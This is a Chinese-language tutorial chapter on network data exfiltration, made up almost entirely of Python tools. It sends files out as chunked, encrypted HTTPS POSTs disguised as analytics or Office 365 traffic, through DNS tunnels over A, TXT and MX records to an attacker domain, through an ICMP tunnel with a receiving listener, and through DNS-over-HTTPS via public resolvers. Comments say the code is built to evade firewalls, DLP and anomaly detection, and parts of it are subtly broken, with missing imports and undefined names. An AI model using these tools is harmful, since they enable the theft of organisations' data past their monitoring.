## §1: 基于网络的外泄技术 (Network-Based Exfiltration)

### 1.1 HTTP/HTTPS POST 外泄

HTTP/S POST 是最常见的外泄方式，但也是最容易被DLP检测的通道。关键在于请求体和请求头的伪装。

#### 基础HTTPS POST外泄 (绕过基本检测)

```python
#!/usr/bin/env python3
"""
HTTPS外泄模块 - 基础版本
功能：将文件内容通过HTTPS POST发送到外泄服务器
绕过：基础防火墙/NIDS
"""

import requests
import os
import json
import gzip
import base64
from typing import Optional
from dataclasses import dataclass
from cryptography.fernet import Fernet
import random
import string

@dataclass
class ExfilConfig:
    target_url: str
    chunk_size: int = 1024 * 512  # 512KB chunks
    use_encryption: bool = True
    use_compression: bool = True
    use_jitter: bool = True
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

class HTTPExfiltrator:
    """HTTP/S数据外泄器 - 分段传输 + 加密 + 压缩"""

    def __init__(self, config: ExfilConfig):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": config.user_agent,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/json",
            "Origin": "https://legitimate-looking-site.com",
            "Referer": "https://legitimate-looking-site.com/dashboard",
            "X-Requested-With": "XMLHttpRequest",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        })
        self.key = Fernet.generate_key() if config.use_encryption else None
        self.cipher = Fernet(self.key) if self.key else None

    def _generate_chunk_id(self) -> str:
        """生成看似正常的chunk ID (伪装为UUID)"""
        return f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(4000, 4999)}-{random.randint(8000, 9999)}-{random.randint(100000000000, 999999999999)}"

    def _jitter(self) -> float:
        """添加随机延迟, 规避基于时间频率的检测"""
        if self.config.use_jitter:
            return random.uniform(0.5, 3.5)
        return 0.0

    def _build_payload(self, chunk_data: bytes, chunk_index: int, total_chunks: int, file_id: str) -> dict:
        """构建伪装为正常API请求的payload"""
        # 伪装成常见的JSON API请求格式
        payload = {
            "analytics_session": self._generate_chunk_id(),
            "telemetry": {
                "event_type": "page_metrics",
                "timestamp": int(os.popen("date +%s%3N").read().strip()),
                "client_id": file_id,
                "properties": {
                    "page_load_time": random.randint(200, 2000),
                    "dom_interactive": random.randint(100, 1500),
                    "first_contentful_paint": random.randint(300, 2500),
                    "chunk_info": {
                        "index": chunk_index,
                        "total": total_chunks,
                        "encoding": "base64",
                    }
                }
            },
            "payload": base64.b64encode(chunk_data).decode("utf-8"),
            "checksum": "",
        }
        return payload

    def exfiltrate_file(self, file_path: str) -> bool:
        """主外泄函数"""
        file_name = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)
        file_id = f"f{random.randint(1000000, 9999999)}"

        total_chunks = (file_size + self.config.chunk_size - 1) // self.config.chunk_size

        print(f"[*] 外泄文件: {file_name} ({file_size} bytes, {total_chunks} chunks)")
        print(f"[*] 外泄目标: {self.config.target_url}")

        with open(file_path, "rb") as f:
            for chunk_idx in range(total_chunks):
                chunk_data = f.read(self.config.chunk_size)

                # 压缩
                if self.config.use_compression:
                    chunk_data = gzip.compress(chunk_data, compresslevel=9)

                # 加密
                if self.cipher:
                    chunk_data = self.cipher.encrypt(chunk_data)

                # 构建payload
                payload = self._build_payload(chunk_data, chunk_idx, total_chunks, file_id)

                # 发送
                try:
                    resp = self.session.post(
                        self.config.target_url,
                        json=payload,
                        timeout=30,
                        verify=False,  # 不验证证书，规避证书检查
                    )
                    import time
                    time.sleep(self._jitter())

                    if resp.status_code != 200:
                        print(f"[!] Chunk {chunk_idx + 1}/{total_chunks} 发送失败: {resp.status_code}")
                        return False
                    print(f"[+] Chunk {chunk_idx + 1}/{total_chunks} 发送成功 ({len(chunk_data)} bytes)")

                except Exception as e:
                    print(f"[!] Chunk {chunk_idx + 1}/{total_chunks} 异常: {e}")
                    return False

        print(f"[+] 文件外泄完成: {file_name}")
        return True

# 使用示例
if __name__ == "__main__":
    config = ExfilConfig(
        target_url="https://analytics.example.com/api/v1/collect",
        chunk_size=512 * 1024,
        use_encryption=True,
        use_compression=True,
        use_jitter=True,
    )
    exfil = HTTPExfiltrator(config)
    exfil.exfiltrate_file("/tmp/sensitive_data.csv")
```

#### 高级HTTP请求伪装 - 模仿正常业务流量

```python
#!/usr/bin/env python3
"""
高级HTTP外泄 - 深度伪装为正常业务流量
策略：模仿Microsoft 365/Google Workspace API流量模式
"""

import requests
import random
import time
import struct
from datetime import datetime

class AdvancedHTTPExfil:
    """高级HTTP外泄器 - 深度伪装"""

    # 模拟不同业务场景的流量模板
    TEMPLATES = {
        "o365_telemetry": {
            "url": "https://outlook.office365.com/api/v2.0/me/sendmail",
            "headers": {
                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTN",
                "X-Client-Telemetry": "1.0",
                "X-AnchorMailbox": "O365:user@company.com",
                "client-request-id": "",
            },
            "payload_template": {
                "Message": {
                    "Subject": "Weekly Report",
                    "Body": {"ContentType": "HTML", "Content": ""},
                    "ToRecipients": [{"EmailAddress": {"Address": "reports@company.com"}}],
                },
                "SaveToSentItems": "false",
            }
        },
        "google_analytics": {
            "url": "https://www.google-analytics.com/mp/collect",
            "headers": {
                "Content-Type": "application/json",
            },
            "payload_template": {
                "client_id": "x",
                "events": [{
                    "name": "page_view",
                    "params": {
                        "page_title": "Dashboard",
                        "page_location": "https://app.company.com/dashboard",
                        "engagement_time_msec": "100",
                    }
                }]
            }
        },
        "cdn_cache": {
            "url": "https://cdn.company.com/static/metrics",
            "headers": {
                "Content-Type": "application/octet-stream",
                "X-CDN-Request": "true",
            }
        }
    }

    def __init__(self, template_name: str = "google_analytics"):
        self.template = self.TEMPLATES[template_name]
        self.session = requests.Session()
        self.session.headers.update(self.template["headers"])

    def _encode_data_in_valueless_field(self, data: bytes) -> str:
        """
        将数据编码到看似无意义的字段中
        例如：client-request-id 或 session-id
        使用Base62编码，避免Base64的明显特征
        """
        import string
        alphabet = string.digits + string.ascii_letters
        base = len(alphabet)

        num = int.from_bytes(data, "big")
        result = []
        while num > 0:
            num, rem = divmod(num, base)
            result.append(alphabet[rem])
        return "".join(reversed(result)) or "0"

    def exfiltrate(self, data: bytes):
        """执行外泄"""
        encoded = self._encode_data_in_valueless_field(data)
        self.session.headers["client-request-id"] = encoded

        payload = self.template["payload_template"].copy()
        # 修改payload中的某个字段来携带数据
        if "events" in payload:
            payload["events"][0]["params"]["engagement_time_msec"] = str(len(data))

        resp = self.session.post(
            self.template["url"],
            json=payload,
            timeout=10
        )
        return resp.status_code == 200
```

### 1.2 DNS隧道外泄

DNS隧道是绕过大多数防火墙和DLP检测的有效手段，因为DNS查询通常不会被深度检查。关键协议：DNS A/AAAA/TXT/MX/CNAME记录。

#### DNS A记录隧道 (DNSCat2风格)

```python
#!/usr/bin/env python3
"""
DNS A记录隧道外泄模块
原理：将数据编码为子域名，通过DNS A记录查询发送到攻击者控制的DNS服务器
优势：绕过大多数防火墙 (DNS通常不受限制)
"""

import dns.resolver
import dns.query
import dns.message
import base64
import time
import random
import hashlib
from typing import List, Optional, Tuple

class DNSTunnelExfil:
    """
    DNS隧道外泄器
    支持: A/AAAA/TXT/MX记录类型
    编码: Base32 (DNS安全) / Base64URL / Hex
    """

    # DNS查询速度配置 (关键：避免触发DNS异常检测)
    QUERY_INTERVAL_MIN = 0.05  # 最小查询间隔 (秒)
    QUERY_INTERVAL_MAX = 0.2   # 最大查询间隔 (秒)
    MAX_LABEL_LENGTH = 63      # DNS标签最大长度
    MAX_SUBDOMAIN_LENGTH = 253 # 完整子域名最大长度

    # 编码器映射
    ENCODERS = {
        "base32": lambda x: base64.b32encode(x).decode().rstrip("=").lower(),
        "base64url": lambda x: base64.b64encode(x).decode().rstrip("=").replace("+", "-").replace("/", "_"),
        "hex": lambda x: x.hex(),
    }

    def __init__(self, domain: str, record_type: str = "A", encoder: str = "base32"):
        """
        Args:
            domain: 攻击者控制的DNS域名 (例如: evil.example.com)
            record_type: DNS记录类型 (A/AAAA/TXT/MX)
            encoder: 数据编码方式
        """
        self.domain = domain
        self.record_type = record_type
        self.encoder = self.ENCODERS[encoder]
        self.resolver = dns.resolver.Resolver()
        self.resolver.nameservers = ["8.8.8.8", "1.1.1.1"]

    def _chunk_data(self, data: bytes, chunk_size: int = 30) -> List[bytes]:
        """将数据分块，确保每块编码后不超过DNS标签长度"""
        # DNS标签最大63字符，Base32编码膨胀率约1.6，所以原始数据30字节较安全
        return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

    def _build_query_name(self, chunk: bytes, chunk_id: int, total_chunks: int, file_id: str) -> str:
        """
        构建DNS查询名称
        格式: {encoded_chunk}.{chunk_id}.{total}.{file_id}.{domain}
        目标子域名: 不超过253字符
        """
        encoded = self.encoder(chunk)
        # 将编码后的数据分割成更小的标签
        labels = [encoded[i:i + 60] for i in range(0, len(encoded), 60)]
        # 添加元数据标签
        meta = f"c{chunk_id}-t{total_chunks}"
        query_name = ".".join(labels + [meta, file_id, self.domain])
        return query_name[:253]  # 确保不超过限制

    def _safe_query(self, query_name: str) -> bool:
        """执行DNS查询，带抖动和重试"""
        time.sleep(random.uniform(self.QUERY_INTERVAL_MIN, self.QUERY_INTERVAL_MAX))

        try:
            if self.record_type == "A":
                answers = self.resolver.resolve(query_name, "A")
            elif self.record_type == "AAAA":
                answers = self.resolver.resolve(query_name, "AAAA")
            elif self.record_type == "TXT":
                answers = self.resolver.resolve(query_name, "TXT")
            elif self.record_type == "MX":
                answers = self.resolver.resolve(query_name, "MX")
            else:
                return False

            return len(answers) > 0

        except dns.resolver.NXDOMAIN:
            # NXDOMAIN也是成功传输 (数据已到达DNS服务器)
            return True
        except dns.resolver.Timeout:
            return False
        except Exception as e:
            print(f"  [!] DNS查询异常: {e}")
            return False

    def exfiltrate_file(self, file_path: str) -> bool:
        """通过DNS隧道外泄文件"""
        file_name = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)
        file_id = hashlib.md5(file_name.encode()).hexdigest()[:8]

        with open(file_path, "rb") as f:
            data = f.read()

        chunks = self._chunk_data(data)
        total_chunks = len(chunks)

        print(f"[*] DNS隧道外泄启动")
        print(f"[*] 文件: {file_name} ({file_size} bytes)")
        print(f"[*] 分块: {total_chunks} chunks (每块30 bytes)")
        print(f"[*] 域名: {self.domain}")
        print(f"[*] 记录类型: {self.record_type}")

        success_count = 0
        for idx, chunk in enumerate(chunks):
            query_name = self._build_query_name(chunk, idx, total_chunks, file_id)

            if self._safe_query(query_name):
                success_count += 1
                if idx % 20 == 0:
                    print(f"  [+] 进度: {idx + 1}/{total_chunks} ({success_count} 成功)")
            else:
                print(f"  [!] Chunk {idx + 1} 失败, 重试中...")
                # 重试3次
                for retry in range(3):
                    time.sleep(random.uniform(0.5, 1.5))
                    if self._safe_query(query_name):
                        success_count += 1
                        break

        print(f"[+] DNS外泄完成: {success_count}/{total_chunks} chunks成功")
        return success_count == total_chunks

# TXT记录隧道 (更高效 - 双向通信)
class DNSTXTTunnel(DNSTunnelExfil):
    """DNS TXT记录隧道 - 支持更高带宽和双向通信"""

    def __init__(self, domain: str):
        super().__init__(domain, record_type="TXT", encoder="base64url")
        self.resolver.nameservers = ["8.8.8.8"]

    def _build_txt_query(self, chunk: bytes, chunk_id: int, total_chunks: int, file_id: str) -> str:
        """TXT记录查询名称构建"""
        encoded = base64.b64encode(chunk).decode().rstrip("=").replace("+", "-").replace("/", "_")
        # 使用更短的元数据格式
        return f"t{chunk_id}.{file_id}.{self.domain}"

    def exfiltrate_with_txt(self, file_path: str) -> Tuple[bool, List[str]]:
        """TXT记录外泄 - 同时接收服务器确认"""
        received_acks = []
        file_name = os.path.basename(file_path)
        file_id = hashlib.md5(file_name.encode()).hexdigest()[:8]

        with open(file_path, "rb") as f:
            data = f.read()

        chunks = self._chunk_data(data, chunk_size=50)  # TXT记录可以承载更多数据

        for idx, chunk in enumerate(chunks):
            query_name = self._build_txt_query(chunk, idx, len(chunks), file_id)

            try:
                answers = self.resolver.resolve(query_name, "TXT")
                for rdata in answers:
                    for txt_string in rdata.strings:
                        received_acks.append(txt_string.decode())
            except Exception:
                pass

            time.sleep(random.uniform(0.1, 0.3))

        return len(received_acks) >= len(chunks) * 0.9, received_acks
```

#### DNS MX记录隧道 (更隐蔽)

```python
#!/usr/bin/env python3
"""
DNS MX记录隧道 - 利用邮件交换记录进行数据外泄
优势：MX记录查询在正常环境中也很常见，不易被检测
"""

class DNSMXTunnel:
    """MX记录隧道 - 模拟邮件服务器查询"""

    def __init__(self, domain: str):
        self.domain = domain
        self.resolver = dns.resolver.Resolver()
        self.resolver.nameservers = ["8.8.8.8"]

    def _encode_to_mx_preference(self, data: bytes) -> List[int]:
        """将数据编码为MX优先级值 (0-65535)"""
        # 每2字节编码为一个16位整数 (MX preference)
        values = []
        for i in range(0, len(data), 2):
            chunk = data[i:i+2]
            if len(chunk) < 2:
                chunk = chunk + b"\x00"
            val = struct.unpack(">H", chunk)[0]
            values.append(val)
        return values

    def exfiltrate_via_mx(self, data: bytes) -> bool:
        """通过MX记录优先级外泄数据"""
        preferences = self._encode_to_mx_preference(data)

        for idx, pref in enumerate(preferences):
            query_name = f"mx{idx}.{self.domain}"

            try:
                # MX查询返回的优先级值包含数据
                answers = self.resolver.resolve(query_name, "MX")
                for rdata in answers:
                    # 验证接收到的优先级
                    received_pref = rdata.preference
                    if received_pref == pref:
                        continue
            except Exception:
                pass

            time.sleep(random.uniform(0.1, 0.5))

        return True
```

### 1.3 ICMP隧道外泄

ICMP（Internet Control Message Protocol）是网络层协议，通常在防火墙中不被深度检查。ICMP隧道可以在ping请求/响应的payload中携带数据。

```python
#!/usr/bin/env python3
"""
ICMP隧道外泄模块
原理：利用ICMP Echo Request/Reply的payload字段传输数据
应用：ptunnel、icmpsh、Hans风格实现
注意：需要root权限发送原始ICMP包
"""

import socket
import struct
import os
import time
import random
import hashlib
import threading
from typing import Optional

class ICMPTunnel:
    """
    ICMP隧道外泄器
    默认payload大小: 56字节 (标准ping大小)
    最大payload大小: 1472字节 (Ethernet MTU)
    """

    ICMP_ECHO_REQUEST = 8
    ICMP_ECHO_REPLY = 0

    def __init__(self, target_ip: str, payload_size: int = 56):
        self.target_ip = target_ip
        self.payload_size = payload_size
        self.sequence = 0
        self.identifier = os.getpid() & 0xFFFF

        # 创建原始套接字
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self.sock.settimeout(2.0)
        except PermissionError:
            print("[!] 需要root权限创建原始套接字")
            raise

    def _checksum(self, data: bytes) -> int:
        """计算ICMP校验和"""
        if len(data) % 2:
            data += b"\x00"

        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            s += w

        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    def _build_icmp_packet(self, payload: bytes, seq: int) -> bytes:
        """构建ICMP Echo Request包"""
        # ICMP头: type(1) + code(1) + checksum(2) + id(2) + seq(2)
        header = struct.pack("!BBHHH", self.ICMP_ECHO_REQUEST, 0, 0, self.identifier, seq)

        # 添加伪装数据 (模拟正常ping)
        timestamp = struct.pack("!Q", int(time.time() * 1000))
        packet_data = timestamp + payload

        # 计算校验和
        chksum = self._checksum(header + packet_data)
        header = struct.pack("!BBHHH", self.ICMP_ECHO_REQUEST, 0, chksum, self.identifier, seq)

        return header + packet_data

    def _send_icmp(self, data: bytes) -> bool:
        """发送ICMP包"""
        self.sequence += 1
        packet = self._build_icmp_packet(data, self.sequence)

        try:
            self.sock.sendto(packet, (self.target_ip, 0))
            return True
        except Exception as e:
            print(f"  [!] 发送失败: {e}")
            return False

    def _chunk_data(self, data: bytes) -> list:
        """将数据分块到ICMP payload大小"""
        chunk_size = self.payload_size - 8  # 减去时间戳8字节
        return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

    def exfiltrate_file(self, file_path: str) -> bool:
        """通过ICMP隧道外泄文件"""
        file_name = os.path.basename(file_path)
        file_size = os.path.getsize(file_path)

        with open(file_path, "rb") as f:
            file_data = f.read()

        chunks = self._chunk_data(file_data)
        total_chunks = len(chunks)

        print(f"[*] ICMP隧道外泄启动")
        print(f"[*] 文件: {file_name} ({file_size} bytes)")
        print(f"[*] 分块: {total_chunks} chunks")
        print(f"[*] 目标: {self.target_ip}")
        print(f"[*] Payload大小: {self.payload_size} bytes")

        # 发送文件头信息
        header = f"{file_name}|{file_size}|{total_chunks}".encode()
        self._send_icmp(header)
        time.sleep(0.5)

        success = 0
        for idx, chunk in enumerate(chunks):
            # 添加分块序号
            chunk_header = struct.pack("!H", idx)
            data = chunk_header + chunk

            if self._send_icmp(data):
                success += 1
                if idx % 50 == 0:
                    print(f"  [+] 进度: {idx + 1}/{total_chunks}")

            time.sleep(random.uniform(0.01, 0.05))  # 正常ping频率

        print(f"[+] ICMP外泄完成: {success}/{total_chunks}")
        return success == total_chunks

# ICMP监听器 (攻击者服务器端)
class ICMPListener:
    """ICMP监听器 - 接收外泄数据"""

    def __init__(self, bind_ip: str = "0.0.0.0"):
        self.bind_ip = bind_ip
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        self.sock.bind((bind_ip, 0))
        self.received_chunks = {}

    def listen(self, timeout: int = 60):
        """监听ICMP数据"""
        self.sock.settimeout(timeout)

        print(f"[*] ICMP监听器启动: {self.bind_ip}")
        file_info = None

        while True:
            try:
                packet, addr = self.sock.recvfrom(65535)
                # 解析ICMP包
                icmp_header = packet[20:28]
                icmp_type, code, checksum, pkt_id, seq = struct.unpack("!BBHHH", icmp_header)

                if icmp_type == self.ICMP_ECHO_REQUEST:
                    payload = packet[28:]

                    if file_info is None:
                        # 第一个包是文件信息
                        file_info = payload.decode()
                        name, size, total = file_info.split("|")
                        print(f"[*] 接收文件: {name} ({size} bytes, {total} chunks)")
                        continue

                    # 提取chunk序号和数据
                    chunk_idx = struct.unpack("!H", payload[:2])[0]
                    chunk_data = payload[2:]

                    self.received_chunks[chunk_idx] = chunk_data
                    print(f"  [+] 接收chunk {chunk_idx} from {addr[0]}")

            except socket.timeout:
                break
            except Exception as e:
                print(f"  [!] 错误: {e}")
                continue

        # 重组数据
        if file_info and self.received_chunks:
            _, name, _, _ = file_info.split("|")
            all_data = b"".join(
                self.received_chunks[i] for i in sorted(self.received_chunks.keys())
            )
            with open(f"/tmp/received_{name}", "wb") as f:
                f.write(all_data)
            print(f"[+] 文件已保存: /tmp/received_{name}")
```

### 1.4 2026 DoH/DoT/DoQ加密DNS外泄

DNS over HTTPS (DoH)、DNS over TLS (DoT) 和 DNS over QUIC (DoQ) 是2026年DNS隧道的高级形式。由于流量被TLS/QUIC加密，传统网络检测设备无法识别DNS查询内容。

```python
#!/usr/bin/env python3
"""
DoH隧道外泄 - DNS over HTTPS
利用Google/Cloudflare的DoH服务进行数据外泄
优势：TLS加密，中间设备完全无法查看DNS查询内容
"""

import requests
import base64
import json
import dns.message
import dns.rdatatype
import dns.rdataclass

class DoHTunnel:
    """DoH隧道外泄器"""

    # 公共DoH服务器
    DOH_SERVERS = [
        "https://dns.google/dns-query",
        "https://cloudflare-dns.com/dns-query",
        "https://dns.quad9.net/dns-query",
        "https://doh.opendns.com/dns-query",
        "https://doh.dns.sb/dns-query",
        "https://dns.adguard.com/dns-query",
    ]

    def __init__(self, domain: str, doh_server: str = None):
        self.domain = domain
        self.doh_server = doh_server or self.DOH_SERVERS[0]
        self.session = requests.Session()
        self.session.headers.update({
            "Accept": "application/dns-json",
            "Content-Type": "application/dns-message",
        })

    def _build_dns_query(self, query_name: str, qtype: str = "A") -> bytes:
        """构建DNS wire格式查询"""
        msg = dns.message.make_query(query_name, dns.rdatatype.from_text(qtype))
        return msg.to_wire()

    def _send_doh_query(self, query_name: str, qtype: str = "A") -> bool:
        """通过DoH发送DNS查询"""
        query_wire = self._build_dns_query(query_name, qtype)

        try:
            # 使用wire格式 (更隐蔽，不是JSON)
            resp = self.session.post(
                self.doh_server,
                data=query_wire,
                headers={"Content-Type": "application/dns-message"},
                timeout=5
            )
            return resp.status_code == 200
        except Exception:
            return False

    def exfiltrate_via_doh(self, data: bytes, chunk_size: int = 30) -> bool:
        """通过DoH外泄数据"""
        encoder = base64.b32hexencode if hasattr(base64, 'b32hexencode') else base64.b32encode
        encoded = encoder(data).decode().lower().rstrip("=")

        # 分块
        chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]

        for idx, chunk in enumerate(chunks):
            query_name = f"{chunk}.c{idx}.{self.domain}"
            if self._send_doh_query(query_name):
                # 轮换DoH服务器
                self.doh_server = random.choice(self.DOH_SERVERS)
            time.sleep(random.uniform(0.1, 0.5))

        return True
```

---

